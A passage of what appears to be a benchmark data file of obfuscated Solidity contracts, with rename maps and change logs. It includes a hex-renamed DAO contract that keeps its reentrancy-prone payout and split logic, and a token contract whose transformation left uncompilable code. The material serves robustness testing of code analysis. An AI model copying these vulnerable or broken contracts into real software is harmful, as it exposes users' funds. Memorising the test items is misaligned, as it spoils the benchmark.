_0x39ba85() returns (bool) {\n        return true;\n    }\n\n    function _0x3f6a9c(\n        address _0x76f85f,\n        uint _0xe1f257,\n        string _0xfa4117,\n        bytes _0x665b98,\n        uint _0x28f5f8,\n        bool _0x2c06b9\n    ) _0x714c90 returns (uint _0xe1ee55) {\n\n        // Sanity check\n        if (_0x2c06b9 && (\n            _0xe1f257 != 0\n            || _0x665b98.length != 0\n            || _0x76f85f == _0xdd2d3a\n            || msg.value > 0\n            || _0x28f5f8 < _0x3af767)) {\n            throw;\n        } else if (\n            !_0x2c06b9\n            && (!_0xe6a32e(_0x76f85f) || (_0x28f5f8 <  _0x90e2de))\n        ) {\n            throw;\n        }\n\n        if (_0x28f5f8 > 8 weeks)\n            throw;\n\n        if (!_0xbe2a20\n            || _0x161ca9 < _0x6873fa\n            || (msg.value < _0x6c3814 && !_0x2c06b9)) {\n\n            throw;\n        }\n\n        if (_0x161ca9 + _0x28f5f8 < _0x161ca9)\n            throw;\n\n        if (msg.sender == address(this))\n            throw;\n\n        _0xe1ee55 = _0x116b51.length++;\n        Proposal p = _0x116b51[_0xe1ee55];\n        p._0xc4e315 = _0x76f85f;\n        p._0x19be9d = _0xe1f257;\n        p._0x2846f7 = _0xfa4117;\n        p._0xa42223 = _0xbf62ce(_0x76f85f, _0xe1f257, _0x665b98);\n        p._0xa0f12b = _0x161ca9 + _0x28f5f8;\n        p._0xce28ae = true;\n        //p.proposalPassed = False; // that's default\n        p._0x3b879f = _0x2c06b9;\n        if (_0x2c06b9)\n            p._0x5a2263.length++;\n        p._0x2b2d77 = msg.sender;\n        p._0x6c3814 = msg.value;\n\n        _0x53a418 += msg.value;\n\n        ProposalAdded(\n            _0xe1ee55,\n            _0x76f85f,\n            _0xe1f257,\n            _0x2c06b9,\n            _0xfa4117\n        );\n    }\n\n    function _0x098d87(\n        uint _0xe1ee55,\n        address _0x76f85f,\n        uint _0xe1f257,\n        bytes _0x665b98\n    ) _0xe5b5da constant returns (bool _0xf82eda) {\n        Proposal p = _0x116b51[_0xe1ee55];\n        return p._0xa42223 == _0xbf62ce(_0x76f85f, _0xe1f257, _0x665b98);\n    }\n\n    function _0x9d6f01(\n        uint _0xe1ee55,\n        bool _0x458854\n    ) _0x714c90 _0xe5b5da returns (uint _0x045d58) {\n\n        Proposal p = _0x116b51[_0xe1ee55];\n        if (p._0xab382e[msg.sender]\n            || p._0x002872[msg.sender]\n            || _0x161ca9 >= p._0xa0f12b) {\n\n            throw;\n        }\n\n        if (_0x458854) {\n            p._0xf745a1 += _0x0c2f1d[msg.sender];\n            p._0xab382e[msg.sender] = true;\n        } else {\n            p._0xc90e48 += _0x0c2f1d[msg.sender];\n            p._0x002872[msg.sender] = true;\n        }\n\n        if (_0xa8738c[msg.sender] == 0) {\n            _0xa8738c[msg.sender] = _0xe1ee55;\n        } else if (p._0xa0f12b > _0x116b51[_0xa8738c[msg.sender]]._0xa0f12b) {\n            // this proposal's voting deadline is further into the future than\n            // the proposal that blocks the sender so make it the blocker\n            _0xa8738c[msg.sender] = _0xe1ee55;\n        }\n\n        Voted(_0xe1ee55, _0x458854, msg.sender);\n    }\n\n    function _0x88cf04(\n        uint _0xe1ee55,\n        bytes _0x665b98\n    ) _0xe5b5da returns (bool _0xf8b324) {\n\n        Proposal p = _0x116b51[_0xe1ee55];\n\n        uint _0x69717f = p._0x3b879f\n            ? _0x49ce24\n            : _0x800f67;\n        // If we are over deadline and waiting period, assert proposal is closed\n        if (p._0xce28ae && _0x161ca9 > p._0xa0f12b + _0x69717f) {\n            _0xdb6eec(_0xe1ee55);\n            return;\n        }\n\n        // Check if the proposal can be executed\n        if (_0x161ca9 < p._0xa0f12b  // has the voting deadline arrived?\n            // Have the votes been counted?\n            || !p._0xce28ae\n            // Does the transaction code match the proposal?\n            || p._0xa42223 != _0xbf62ce(p._0xc4e315, p._0x19be9d, _0x665b98)) {\n\n            throw;\n        }\n\n        // If the curator removed the recipient from the whitelist, close the proposal\n        // in order to free the deposit and allow unblocking of voters\n        if (!_0xe6a32e(p._0xc4e315)) {\n            _0xdb6eec(_0xe1ee55);\n            p._0x2b2d77.send(p._0x6c3814);\n            return;\n        }\n\n        bool _0x2049d4 = true;\n\n        if (p._0x19be9d > _0xe4a69f())\n            _0x2049d4 = false;\n\n        uint _0x68a262 = p._0xf745a1 + p._0xc90e48;\n\n        // require 53% for calling newContract()\n        if (_0x665b98.length >= 4 && _0x665b98[0] == 0x68\n            && _0x665b98[1] == 0x37 && _0x665b98[2] == 0xff\n            && _0x665b98[3] == 0x1e\n            && _0x68a262 < _0x2cd4b0(_0xe4a69f() + _0x4386bd[address(this)])) {\n\n                _0x2049d4 = false;\n        }\n\n        if (_0x68a262 >= _0x2cd4b0(p._0x19be9d)) {\n            if (!p._0x2b2d77.send(p._0x6c3814))\n                throw;\n\n            _0x094540 = _0x161ca9;\n            // set the minQuorum to 20% again, in the case it has been reached\n            if (_0x68a262 > _0xe90ca9 / 5)\n                _0xe76d34 = 5;\n        }\n\n        // Execute result\n        if (_0x68a262 >= _0x2cd4b0(p._0x19be9d) && p._0xf745a1 > p._0xc90e48 && _0x2049d4) {\n            if (!p._0xc4e315.call.value(p._0x19be9d)(_0x665b98))\n                throw;\n\n            p._0x8f4228 = true;\n            _0xf8b324 = true;\n\n            // only create reward tokens when ether is not sent to the DAO itself and\n            // related addresses. Proxy addresses should be forbidden by the curator.\n            if (p._0xc4e315 != address(this) && p._0xc4e315 != address(_0xd2e8fe)\n                && p._0xc4e315 != address(DAOrewardAccount)\n                && p._0xc4e315 != address(_0xe206d9)\n                && p._0xc4e315 != address(_0xdd2d3a)) {\n\n                _0x4386bd[address(this)] += p._0x19be9d;\n                _0x7b56f6 += p._0x19be9d;\n            }\n        }\n\n        _0xdb6eec(_0xe1ee55);\n\n        // Initiate event\n        ProposalTallied(_0xe1ee55, _0xf8b324, _0x68a262);\n    }\n\n    function _0xdb6eec(uint _0xe1ee55) internal {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n        Proposal p = _0x116b51[_0xe1ee55];\n        if (p._0xce28ae)\n            _0x53a418 -= p._0x6c3814;\n        p._0xce28ae = false;\n    }\n\n    function _0x5515b0(\n        uint _0xe1ee55,\n        address _0x2c06b9\n    ) _0xe5b5da _0x714c90 returns (bool _0xf8b324) {\n\n        Proposal p = _0x116b51[_0xe1ee55];\n\n        // Sanity check\n\n        if (_0x161ca9 < p._0xa0f12b  // has the voting deadline arrived?\n            //The request for a split expires XX days after the voting deadline\n            || _0x161ca9 > p._0xa0f12b + _0x49ce24\n            // Does the new Curator address match?\n            || p._0xc4e315 != _0x2c06b9\n            // Is it a new curator proposal?\n            || !p._0x3b879f\n            // Have you voted for this split?\n            || !p._0xab382e[msg.sender]\n            // Did you already vote on another proposal?\n            || (_0xa8738c[msg.sender] != _0xe1ee55 && _0xa8738c[msg.sender] != 0) )  {\n\n            throw;\n        }\n\n        // If the new DAO doesn't exist yet, create the new DAO and store the\n        // current split data\n        if (address(p._0x5a2263[0]._0xe8af3a) == 0) {\n            p._0x5a2263[0]._0xe8af3a = _0x0fc40c(_0x2c06b9);\n            // Call depth limit reached, etc.\n            if (address(p._0x5a2263[0]._0xe8af3a) == 0)\n                throw;\n            // should never happen\n            if (this.balance < _0x53a418)\n                throw;\n            p._0x5a2263[0]._0xb0c2d7 = _0xe4a69f();\n            p._0x5a2263[0]._0x4386bd = _0x4386bd[address(this)];\n            p._0x5a2263[0]._0xe90ca9 = _0xe90ca9;\n            p._0x8f4228 = true;\n        }\n\n        // Move ether and assign new Tokens\n        uint _0xcfd53b =\n            (_0x0c2f1d[msg.sender] * p._0x5a2263[0]._0xb0c2d7) /\n            p._0x5a2263[0]._0xe90ca9;\n        if (p._0x5a2263[0]._0xe8af3a._0xbbfb49.value(_0xcfd53b)(msg.sender) == false)\n            throw;\n\n        // Assign reward rights to new DAO\n        uint _0x57e823 =\n            (_0x0c2f1d[msg.sender] * p._0x5a2263[0]._0x4386bd) /\n            p._0x5a2263[0]._0xe90ca9;\n\n        uint _0x796d33 = DAOpaidOut[address(this)] * _0x57e823 /\n            _0x4386bd[address(this)];\n\n        _0x4386bd[address(p._0x5a2263[0]._0xe8af3a)] += _0x57e823;\n        if (_0x4386bd[address(this)] < _0x57e823)\n            throw;\n        _0x4386bd[address(this)] -= _0x57e823;\n\n        DAOpaidOut[address(p._0x5a2263[0]._0xe8af3a)] += _0x796d33;\n        if (DAOpaidOut[address(this)] < _0x796d33)\n            throw;\n        DAOpaidOut[address(this)] -= _0x796d33;\n\n        // Burn DAO Tokens\n        Transfer(msg.sender, 0, _0x0c2f1d[msg.sender]);\n        _0x11768a(msg.sender); // be nice, and get his rewards\n        _0xe90ca9 -= _0x0c2f1d[msg.sender];\n        _0x0c2f1d[msg.sender] = 0;\n        _0x20fc25[msg.sender] = 0;\n        return true;\n    }\n\n    function _0x19bf77(address _0x3b7ba0){\n        if (msg.sender != address(this) || !_0x6e1876[_0x3b7ba0]) return;\n        // move all ether\n        if (!_0x3b7ba0.call.value(address(this).balance)()) {\n            throw;\n        }\n\n        //move all reward tokens\n        _0x4386bd[_0x3b7ba0] += _0x4386bd[address(this)];\n        _0x4386bd[address(this)] = 0;\n        DAOpaidOut[_0x3b7ba0] += DAOpaidOut[address(this)];\n        DAOpaidOut[address(this)] = 0;\n    }\n\n    function _0x2f0b78(bool _0xd120e7) external _0xe5b5da returns (bool _0xf8b324) {\n        DAO _0x7db346 = DAO(msg.sender);\n\n        if ((_0x4386bd[msg.sender] * DAOrewardAccount._0x4edb1b()) /\n            _0x7b56f6 < DAOpaidOut[msg.sender])\n            throw;\n\n        uint _0xe9875f =\n            (_0x4386bd[msg.sender] * DAOrewardAccount._0x4edb1b()) /\n            _0x7b56f6 - DAOpaidOut[msg.sender];\n        if(_0xd120e7) {\n            if (!DAOrewardAccount._0xa1d745(_0x7db346._0xd2e8fe(), _0xe9875f))\n                throw;\n            }\n        else {\n            if (!DAOrewardAccount._0xa1d745(_0x7db346, _0xe9875f))\n                throw;\n        }\n        DAOpaidOut[msg.sender] += _0xe9875f;\n        return true;\n    }\n\n    function _0x50da57() _0xe5b5da returns (bool _0xf8b324) {\n        return _0x11768a(msg.sender);\n    }\n\n    function _0x11768a(address _0x8feb49) _0xe5b5da internal returns (bool _0xf8b324) {\n        if ((_0xf06056(_0x8feb49) * _0xd2e8fe._0x4edb1b()) / _0xe90ca9 < _0x20fc25[_0x8feb49])\n            throw;\n\n        uint _0xe9875f =\n            (_0xf06056(_0x8feb49) * _0xd2e8fe._0x4edb1b()) / _0xe90ca9 - _0x20fc25[_0x8feb49];\n        if (!_0xd2e8fe._0xa1d745(_0x8feb49, _0xe9875f))\n            throw;\n        _0x20fc25[_0x8feb49] += _0xe9875f;\n        return true;\n    }\n\n    function transfer(address _0x4ecdd8, uint256 _0x8791c8) returns (bool _0xde260f) {\n        if (_0xbe2a20\n            && _0x161ca9 > _0x6873fa\n            && !_0x624a93(msg.sender)\n            && _0xbb2080(msg.sender, _0x4ecdd8, _0x8791c8)\n            && super.transfer(_0x4ecdd8, _0x8791c8)) {\n\n            return true;\n        } else {\n            throw;\n        }\n    }\n\n    function _0xf38620(address _0x4ecdd8, uint256 _0x8791c8) returns (bool _0xde260f) {\n        if (!_0x50da57())\n            throw;\n        return transfer(_0x4ecdd8, _0x8791c8);\n    }\n\n    function _0xdcc9dc(address _0xac3031, address _0x4ecdd8, uint256 _0x8791c8) returns (bool _0xde260f) {\n        if (_0xbe2a20\n            && _0x161ca9 > _0x6873fa\n            && !_0x624a93(_0xac3031)\n            && _0xbb2080(_0xac3031, _0x4ecdd8, _0x8791c8)\n            && super._0xdcc9dc(_0xac3031, _0x4ecdd8, _0x8791c8)) {\n\n            return true;\n        } else {\n            throw;\n        }\n    }\n\n    function _0x3e6edf(\n        address _0xac3031,\n        address _0x4ecdd8,\n        uint256 _0x8791c8\n    ) returns (bool _0xde260f) {\n\n        if (!_0x11768a(_0xac3031))\n            throw;\n        return _0xdcc9dc(_0xac3031, _0x4ecdd8, _0x8791c8);\n    }\n\n    function _0xbb2080(\n        address _0xac3031,\n        address _0x4ecdd8,\n        uint256 _0x8791c8\n    ) internal returns (bool _0xde260f) {\n\n        uint _0xbb2080 = _0x20fc25[_0xac3031] * _0x8791c8 / _0xf06056(_0xac3031);\n        if (_0xbb2080 > _0x20fc25[_0xac3031])\n            throw;\n        _0x20fc25[_0xac3031] -= _0xbb2080;\n        _0x20fc25[_0x4ecdd8] += _0xbb2080;\n        return true;\n    }\n\n    function _0x6c9139(uint _0xa2cc3d) _0xe5b5da external {\n        if (msg.sender != address(this) || _0xa2cc3d > (_0xe4a69f() + _0x4386bd[address(this)])\n            / _0x860c40) {\n\n            throw;\n        }\n        _0x6c3814 = _0xa2cc3d;\n    }\n\n    function _0xdfeca7(address _0x76f85f, bool _0x8e9f6b) _0xe5b5da external returns (bool _0xf8b324) {\n        if (msg.sender != _0xdd2d3a)\n            throw;\n        _0x6e1876[_0x76f85f] = _0x8e9f6b;\n        AllowedRecipientChanged(_0x76f85f, _0x8e9f6b);\n        return true;\n    }\n\n    function _0xe6a32e(address _0x76f85f) internal returns (bool _0x3b2f96) {\n        if (_0x6e1876[_0x76f85f]\n            || (_0x76f85f == address(_0xe206d9)\n                // only allowed when at least the amount held in the\n                // extraBalance account has been spent from the DAO\n                && _0x7b56f6 > _0xe206d9._0x4edb1b()))\n            return true;\n        else\n            return false;\n    }\n\n    function _0xe4a69f() constant returns (uint _0x7fd1df) {\n        return this.balance - _0x53a418;\n    }\n\n    function _0x2cd4b0(uint _0x8791c8) internal constant returns (uint _0x41d1d0) {\n        // minimum of 20% and maximum of 53.33%\n        return _0xe90ca9 / _0xe76d34 +\n            (_0x8791c8 * _0xe90ca9) / (3 * (_0xe4a69f() + _0x4386bd[address(this)]));\n    }\n\n    function _0xcf9a70() returns (bool _0xf8b324) {\n        // this can only be called after `quorumHalvingPeriod` has passed or at anytime\n        // by the curator with a delay of at least `minProposalDebatePeriod` between the calls\n        if ((_0x094540 < (_0x161ca9 - _0x622a4d) || msg.sender == _0xdd2d3a)\n            && _0x094540 < (_0x161ca9 - _0x90e2de)) {\n            _0x094540 = _0x161ca9;\n            _0xe76d34 *= 2;\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    function _0x0fc40c(address _0x2c06b9) internal returns (DAO _0x334c6b) {\n        NewCurator(_0x2c06b9);\n        return _0x6ebd70._0x05d372(_0x2c06b9, 0, 0, _0x161ca9 + _0x49ce24);\n    }\n\n    function _0x92d8bb() constant returns (uint _0x188774) {\n        // Don't count index 0. It's used by isBlocked() and exists from start\n        return _0x116b51.length - 1;\n    }\n\n    function _0xcae6ff(uint _0xe1ee55) constant returns (address _0x334c6b) {\n        return _0x116b51[_0xe1ee55]._0x5a2263[0]._0xe8af3a;\n    }\n\n    function _0x624a93(address _0x8feb49) internal returns (bool) {\n        if (_0xa8738c[_0x8feb49] == 0)\n            return false;\n        Proposal p = _0x116b51[_0xa8738c[_0x8feb49]];\n        if (_0x161ca9 > p._0xa0f12b) {\n            _0xa8738c[_0x8feb49] = 0;\n            return false;\n        } else {\n            return true;\n        }\n    }\n\n    function _0x2542a5() returns (bool) {\n        return _0x624a93(msg.sender);\n    }\n}\n\ncontract DAO_Creator {\n    function _0x05d372(\n        address _0xb67c0e,\n        uint _0xa2cc3d,\n        uint _0xe0641a,\n        uint _0xd42887\n    ) returns (DAO _0x334c6b) {\n\n        return new DAO(\n            _0xb67c0e,\n            DAO_Creator(this),\n            _0xa2cc3d,\n            _0xe0641a,\n            _0xd42887,\n            msg.sender\n        );\n    }\n}\n",
      "rename_map": {
        "transferFromWithoutReward": "_0x3e6edf",
        "minProposalDebatePeriod": "_0x90e2de",
        "changeAllowedRecipients": "_0xdfeca7",
        "sumOfProposalDeposits": "_0x53a418",
        "changeProposalDeposit": "_0x6c9139",
        "executeProposalPeriod": "_0x800f67",
        "transferWithoutReward": "_0xf38620",
        "splitExecutionPeriod": "_0x49ce24",
        "lastTimeMinQuorumMet": "_0x094540",
        "minSplitDebatePeriod": "_0x3af767",
        "rewardTokenToBeMoved": "_0x57e823",
        "quorumHalvingPeriod": "_0x622a4d",
        "creationGracePeriod": "_0x28a77a",
        "_numberOfProposals": "_0x188774",
        "_minTokensToCreate": "_0xe0641a",
        "isRecipientAllowed": "_0xe6a32e",
        "allowedRecipients": "_0x6e1876",
        "minTokensToCreate": "_0x51c8a5",
        "_supportsProposal": "_0x458854",
        "checkProposalCode": "_0x098d87",
        "maxDepositDivisor": "_0x860c40",
        "withdrawRewardFor": "_0x11768a",
        "numberOfProposals": "_0x92d8bb",
        "retrieveDAOReward": "_0x2f0b78",
        "createTokenProxy": "_0xbbfb49",
        "_privateCreation": "_0xa5f5d6",
        "paidOutToBeMoved": "_0x796d33",
        "_transactionData": "_0x665b98",
        "getNewDAOAddress": "_0xcae6ff",
        "minQuorumDivisor": "_0xe76d34",
        "totalRewardToken": "_0x7b56f6",
        "accumulatedInput": "_0x4edb1b",
        "_proposalDeposit": "_0xa2cc3d",
        "onlyTokenholders": "_0x714c90",
        "_debatingPeriod": "_0x28f5f8",
        "transferPaidOut": "_0xbb2080",
        "privateCreation": "_0xf0746b",
        "executeProposal": "_0x88cf04",
        "proposalDeposit": "_0x6c3814",
        "proposalPassed": "_0x8f4228",
        "_actualBalance": "_0x7fd1df",
        "_codeChecksOut": "_0xf82eda",
        "halveMinQuorum": "_0xcf9a70",
        "votingDeadline": "_0xa0f12b",
        "fundsToBeMoved": "_0xcfd53b",
        "rewardAccount": "_0xd2e8fe",
        "actualBalance": "_0xe4a69f",
        "proposalCheck": "_0x2049d4",
        "closeProposal": "_0xdb6eec",
        "_payOwnerOnly": "_0x3f4ff8",
        "payOwnerOnly": "_0x014b70",
        "transferFrom": "_0xdcc9dc",
        "splitBalance": "_0xb0c2d7",
        "proposalHash": "_0xa42223",
        "extraBalance": "_0xe206d9",
        "_newContract": "_0x3b7ba0",
        "_closingTime": "_0xd42887",
        "receiveEther": "_0x39ba85",
        "_tokenHolder": "_0xdfbeb9",
        "createNewDAO": "_0x0fc40c",
        "_description": "_0xfa4117",
        "_daoCreator": "_0x3a1db8",
        "_proposalID": "_0xe1ee55",
        "_newCurator": "_0x2c06b9",
        "newProposal": "_0x3f6a9c",
        "closingTime": "_0x6873fa",
        "description": "_0x2846f7",
        "rewardToken": "_0x4386bd",
        "totalSupply": "_0xe90ca9",
        "newContract": "_0x19bf77",
        "getMyReward": "_0x50da57",
        "_minQuorum": "_0x41d1d0",
        "waitPeriod": "_0x69717f",
        "_toMembers": "_0xd120e7",
        "_recipient": "_0x76f85f",
        "proposalID": "_0x875e7e",
        "_isAllowed": "_0x3b2f96",
        "daoCreator": "_0x6ebd70",
        "newCurator": "_0x3b879f",
        "proposals": "_0x116b51",
        "balanceOf": "_0xf06056",
        "splitData": "_0x5a2263",
        "minQuorum": "_0x2cd4b0",
        "isBlocked": "_0x624a93",
        "unblockMe": "_0x2542a5",
        "allowance": "_0x200f84",
        "createDAO": "_0x05d372",
        "recipient": "_0xc4e315",
        "remaining": "_0x08ecc4",
        "_account": "_0x8feb49",
        "weiGiven": "_0x6304f1",
        "votedYes": "_0xab382e",
        "_allowed": "_0x8e9f6b",
        "position": "_0x9d8847",
        "_spender": "_0xa17e1e",
        "splitDAO": "_0x5515b0",
        "_curator": "_0xb67c0e",
        "_success": "_0xf8b324",
        "isFueled": "_0xbe2a20",
        "balances": "_0x0c2f1d",
        "_newDAO": "_0x334c6b",
        "_voteID": "_0x045d58",
        "divisor": "_0x3c32e6",
        "allowed": "_0xa8843b",
        "approve": "_0xe9ed2a",
        "blocked": "_0xa8738c",
        "votedNo": "_0x002872",
        "_amount": "_0xe1f257",
        "paidOut": "_0x20fc25",
        "curator": "_0xdd2d3a",
        "creator": "_0x2b2d77",
        "noEther": "_0xe5b5da",
        "success": "_0xde260f",
        "quorum": "_0x68a262",
        "reward": "_0xe9875f",
        "_owner": "_0xdc7af5",
        "newDAO": "_0xe8af3a",
        "amount": "_0x19be9d",
        "_value": "_0x8791c8",
        "result": "_0xcad050",
        "refund": "_0xbcfb63",
        "payOut": "_0xa1d745",
        "voter": "_0xa2fbfd",
        "token": "_0xb71683",
        "_from": "_0xac3031",
        "owner": "_0xa92fda",
        "sha3": "_0xbf62ce",
        "vote": "_0x9d6f01",
        "open": "_0xce28ae",
        "now": "_0x161ca9",
        "dao": "_0x7db346",
        "_to": "_0x4ecdd8",
        "yea": "_0xf745a1",
        "nay": "_0xc90e48",
        "to": "_0x40c5b0"
      },
      "changes": [
        "Renamed 135 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_114",
      "transformed_id": "ss_l4_medium_sn_ds_114",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// https://etherscan.io/address/0xf91546835f756da0c10cfa0cda95b15577b84aa7#code\n\npragma solidity ^0.4.23;\n// produced by the Solididy File Flattener (c) David Appleton 2018\n// contact : dave@akomba.com\n// released under Apache 2.0 licence\ncontract Token {\n    /// total amount of tokens\n    uint256 public _0xb6bdd3;\n\n    /// @param _owner The address from which the balance will be retrieved\n    /// @return The balance\n    function _0x99b461(address _0xf47841) public constant returns (uint256 balance);\n\n    /// @notice send `_value` token to `_to` from `msg.sender`\n    /// @param _to The address of the recipient\n    /// @param _value The amount of token to be transferred\n    /// @return Whether the transfer was successful or not\n    function transfer(address _0x294f2c, uint256 _0x34edf1) public returns (bool _0x953439);\n\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n    /// @param _from The address of the sender\n    /// @param _to The address of the recipient\n    /// @param _value The amount of token to be transferred\n    /// @return Whether the transfer was successful or not\n    function _0x6cad58(address _0x44bc5f, address _0x294f2c, uint256 _0x34edf1) public returns (bool _0x953439);\n\n    /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @param _value The amount of tokens to be approved for transfer\n    /// @return Whether the approval was successful or not\n    function _0x817afa(address _0x5297fc, uint256 _0x34edf1) public returns (bool _0x953439);\n\n    /// @param _owner The address of the account owning tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @return Amount of remaining tokens allowed to spent\n    function _0x47a83a(address _0xf47841, address _0x5297fc) public constant returns (uint256 _0xedcb5c);\n\n    event Transfer(address indexed _0x44bc5f, address indexed _0x294f2c, uint256 _0x34edf1);\n    event Approval(address indexed _0xf47841, address indexed _0x5297fc, uint256 _0x34edf1);\n}\n\nlibrary ECTools {\n        if (false) { revert(); }\n        if (false) { revert(); }\n\n    // @dev Recovers the address which has signed a message\n    // @thanks https://gist.github.com/axic/5b33912c6f61ae6fd96d6c4a47afde6d\n    function _0x1b5c77(bytes32 _0x5b5dff, string _0x6cacb4) public pure returns (address) {\n        uint256 _unused3 = 0;\n        bool _flag4 = false;\n        require(_0x5b5dff != 0x00);\n\n        // need this for test RPC\n        bytes memory _0xcf9b4d = \"\\x19Ethereum Signed Message:\\n32\";\n        bytes32 _0xa5971d = _0x4e411f(abi._0x19c983(_0xcf9b4d, _0x5b5dff));\n\n        if (bytes(_0x6cacb4).length != 132) {\n            return 0x0;\n        }\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n        bytes memory sig = _0x0924c0(_0x6f4a52(_0x6cacb4, 2, 132));\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n        if (v < 27) {\n            v += 27;\n        }\n        if (v < 27 || v > 28) {\n            return 0x0;\n        }\n        return _0xdd1be8(_0xa5971d, v, r, s);\n    }\n\n    // @dev Verifies if the message is signed by an address\n    function _0xdeef15(bytes32 _0x5b5dff, string _0x6cacb4, address _0xd49535) public pure returns (bool) {\n        require(_0xd49535 != 0x0);\n\n        return _0xd49535 == _0x1b5c77(_0x5b5dff, _0x6cacb4);\n    }\n\n    // @dev Converts an hexstring to bytes\n    function _0x0924c0(string _0x7f4e90) public pure returns (bytes) {\n        uint _0xa673d2 = bytes(_0x7f4e90).length;\n        require(_0xa673d2 % 2 == 0);\n\n        bytes memory _0x66321e = bytes(new string(_0xa673d2 / 2));\n        uint k = 0;\n        string memory s;\n        string memory r;\n        for (uint i = 0; i < _0xa673d2; i += 2) {\n            s = _0x6f4a52(_0x7f4e90, i, i + 1);\n            r = _0x6f4a52(_0x7f4e90, i + 1, i + 2);\n            uint p = _0x923b58(s) * 16 + _0x923b58(r);\n            _0x66321e[k++] = _0xc81305(p)[31];\n        }\n        return _0x66321e;\n    }\n\n    // @dev Parses a hexchar, like 'a', and returns its hex value, in this case 10\n    function _0x923b58(string _0xdbbe0f) public pure returns (uint) {\n        bytes memory _0x27c717 = bytes(_0xdbbe0f);\n        // bool decimals = false;\n        if ((_0x27c717[0] >= 48) && (_0x27c717[0] <= 57)) {\n            return uint(_0x27c717[0]) - 48;\n        } else if ((_0x27c717[0] >= 65) && (_0x27c717[0] <= 70)) {\n            return uint(_0x27c717[0]) - 55;\n        } else if ((_0x27c717[0] >= 97) && (_0x27c717[0] <= 102)) {\n            return uint(_0x27c717[0]) - 87;\n        } else {\n            revert();\n        }\n    }\n\n    // @dev Converts a uint to a bytes32\n    // @thanks https://ethereum.stackexchange.com/questions/4170/how-to-convert-a-uint-to-bytes-in-solidity\n    function _0xc81305(uint _0xc1668d) public pure returns (bytes b) {\n        b = new bytes(32);\n        assembly {mstore(add(b, 32), _0xc1668d)}\n    }\n\n    // @dev Hashes the signed message\n    // @ref https://github.com/ethereum/go-ethereum/issues/3731#issuecomment-293866868\n    function _0xe110a2(string _0x767709) public pure returns (bytes32) {\n        uint _0xa673d2 = bytes(_0x767709).length;\n        require(_0xa673d2 > 0);\n        bytes memory _0xcf9b4d = \"\\x19Ethereum Signed Message:\\n\";\n        return _0x4e411f(abi._0x19c983(_0xcf9b4d, _0x17d7c7(_0xa673d2), _0x767709));\n    }\n\n    // @dev Converts a uint in a string\n    function _0x17d7c7(uint _0xc1668d) public pure returns (string _0xe80de5) {\n        uint _0xa673d2 = 0;\n        uint m = _0xc1668d + 0;\n        while (m != 0) {\n            _0xa673d2++;\n            m /= 10;\n        }\n        bytes memory b = new bytes(_0xa673d2);\n        uint i = _0xa673d2 - 1;\n        while (_0xc1668d != 0) {\n            uint _0x6a0cd0 = _0xc1668d % 10;\n            if (true) { _0xc1668d = _0xc1668d / 10; }\n            b[i--] = byte(48 + _0x6a0cd0);\n        }\n        _0xe80de5 = string(b);\n    }\n\n    // @dev extract a substring\n    // @thanks https://ethereum.stackexchange.com/questions/31457/substring-in-solidity\n    function _0x6f4a52(string _0x19c8fa, uint _0x94b365, uint _0x100427) public pure returns (string) {\n        bytes memory _0x047336 = bytes(_0x19c8fa);\n        require(_0x94b365 <= _0x100427);\n        require(_0x94b365 >= 0);\n        require(_0x100427 <= _0x047336.length);\n\n        bytes memory _0xa76dc9 = new bytes(_0x100427 - _0x94b365);\n        for (uint i = _0x94b365; i < _0x100427; i++) {\n            _0xa76dc9[i - _0x94b365] = _0x047336[i];\n        }\n        return string(_0xa76dc9);\n    }\n}\ncontract StandardToken is Token {\n\n    function transfer(address _0x294f2c, uint256 _0x34edf1) public returns (bool _0x953439) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n        //Replace the if with this one instead.\n        //require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        require(_0x6be511[msg.sender] >= _0x34edf1);\n        _0x6be511[msg.sender] -= _0x34edf1;\n        _0x6be511[_0x294f2c] += _0x34edf1;\n        emit Transfer(msg.sender, _0x294f2c, _0x34edf1);\n        return true;\n    }\n\n    function _0x6cad58(address _0x44bc5f, address _0x294f2c, uint256 _0x34edf1) public returns (bool _0x953439) {\n\n        //require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        require(_0x6be511[_0x44bc5f] >= _0x34edf1 && _0x689618[_0x44bc5f][msg.sender] >= _0x34edf1);\n        _0x6be511[_0x294f2c] += _0x34edf1;\n        _0x6be511[_0x44bc5f] -= _0x34edf1;\n        _0x689618[_0x44bc5f][msg.sender] -= _0x34edf1;\n        emit Transfer(_0x44bc5f, _0x294f2c, _0x34edf1);\n        return true;\n    }\n\n    function _0x99b461(address _0xf47841) public constant returns (uint256 balance) {\n        return _0x6be511[_0xf47841];\n    }\n\n    function _0x817afa(address _0x5297fc, uint256 _0x34edf1) public returns (bool _0x953439) {\n        _0x689618[msg.sender][_0x5297fc] = _0x34edf1;\n        emit Approval(msg.sender, _0x5297fc, _0x34edf1);\n        return true;\n    }\n\n    function _0x47a83a(address _0xf47841, address _0x5297fc) public constant returns (uint256 _0xedcb5c) {\n      return _0x689618[_0xf47841][_0x5297fc];\n    }\n\n    mapping (address => uint256) _0x6be511;\n    mapping (address => mapping (address => uint256)) _0x689618;\n}\n\ncontract HumanStandardToken is StandardToken {\n\n    /* Public variables of the token */\n\n    string public _0x7245fc;                   //fancy name: eg Simon Bucks\n    uint8 public _0x7b7072;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n    string public _0xc1dc75;                 //An identifier: eg SBX\n    string public _0x4221e6 = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\n\n    constructor(\n        uint256 _0x5bb1bf,\n        string _0xed2893,\n        uint8 _0x58815a,\n        string _0xa6fdb1\n        ) public {\n        _0x6be511[msg.sender] = 